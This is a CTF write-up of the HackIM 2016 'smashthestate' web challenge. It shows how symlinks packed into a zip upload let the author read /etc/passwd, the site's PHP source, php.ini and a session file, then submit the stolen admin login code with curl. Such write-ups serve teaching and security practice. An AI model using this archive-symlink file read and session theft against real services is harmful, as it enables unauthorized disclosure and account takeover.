---
layout: post
title:  "hackim 2016: smasththestate (web 400)"
author: f0rki
categories: writeup
---

* **Category:** web
* **Points:** 400
* **Description:**

> This beautiful website for testing zip files contains a replica of a vulnerability found in a well known bug bounty site.
> Log in with rob:smashthestate then exploit the vulnerability to gain access to the 'admin' account and the flag.
> Automated tools and bruteforcing will not help you solve this challenge.

## Write-up

We can login with the given credentials and upload a zip file. This zip file is
then unpacked and all the contents are `cat`ed.

When some archive (zip, tar or whatever) is unpacked the two things I try first
is: relative paths in the filename and symlinks. This time you could upload
symlinks. For this we must use the `-y` flag on the zip tool.

    $ ln -s /etc/passwd
    $ zip -y pwn.zip passwd

Upload and enjoy the passwd file. OK so we can read any file with the
webservers permission. Good start. Next we can use the vulnerability to get the
source of the site.

    $ ln -s ../../index.php
    $ zip -y pwn.zip index.php

And it happily dumps us the source code :) This is the vulnerable piece of code
that handles the zip upload:

    $tmp_file = '/var/www/html/tmp/upload_'.session_id();

    # ZipArchive may not be available
    # $zip = new ZipArchive;
    # $zip->open($_FILES['zipfile']['name']);
    # $zip->extractTo($tmp_file);
    exec('unzip -o '.$_FILES['zipfile']['tmp_name']. ' -d '.$tmp_file);
    echo "Zip contents: <br/>";
    passthru("cat $tmp_file/* 2>&1");
    exec("rm -rf $tmp_file");


Now how to get to the flag? It's easy to spot the interesting piece of code:

    $code = $_POST['code'];
    if (isset($code) && isset($_SESSION['login_code'])) {
        if ($code === $_SESSION['login_code'] ){
            echo "Flag: ";
            passthru("sudo /bin/cat /var/www/html/flag");
        }
        else {
            echo "Invalid code";
        }
    }

Apparently we are supposed to find the admin login code that is set in the
session. It is set in the following piece of code which we can trigger by
visiting `?page=admin_login_help`. It uses `openssl_random_pseudo_bytes` which
I assume is safe in terms of randomness.

    session_start();
    if(!isset($_SESSION['login_code']) ){
        $_SESSION['login_code'] = bin2hex(openssl_random_pseudo_bytes(18));
        echo "A login code has been emailed to the administrator. Once you have recieved it, please click <a href='?page=code_submit'>here</a>\n";
    }
    else {
        echo "There is already an active login code for this session";
    }

Let's find out how php is configured to store it's sessions. We can fetch the
active php.ini from `/etc/php5/apache2/php.ini`, again using the symlink in zip
vulnerability. From there we can see that it's stored in files under
`/var/lib/php5/`. So in my case I read the file
`/var/lib/php5/sess_a7l9q5dihoumkg02cjkagh8gj1` again using the zip symlink
vulnerability to get the login_code. Then it was simply a matter of submitting
the login code.

    $ curl 'http://54.152.101.3/?page=code_submit' \
        -H 'Cookie: PHPSESSID=a7l9q5dihoumkg02cjkagh8gj1'
        --data 'code=742aa277b035c96ef64cba0364c75e214596'

At first this returned nothing, so it seemed the flag file was empty or they
didn't configure sudo. Anyway after complaining on IRC and waiting a little,
the flag reading worked and it turned out to be:

    8e11a50ef762f924d7af9995889873e4

What a boring flag :(
